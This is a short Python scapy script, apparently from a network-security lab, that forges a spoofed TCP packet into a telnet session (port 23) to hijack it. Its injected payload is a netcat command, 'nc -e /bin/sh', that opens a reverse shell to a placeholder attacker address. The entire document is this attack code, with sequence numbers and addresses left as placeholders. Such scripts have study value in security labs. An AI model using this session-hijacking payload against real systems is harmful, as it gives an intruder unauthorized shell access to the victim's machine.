from scapy.all import *

IPLayer = IP(src="10.10.10.xxxx", dst="10.10.10.xxxx")
TCPLayer = TCP(sport=34234, dport=23, flags="A", seq=0000000000, ack=00000000)

data = "\n nc -e /bin/sh 10.10.10.xx xxxx \n"

pkt = IPLayer/TCPLayer/data
ls(pkt)
send(pkt, verbose= 0) 
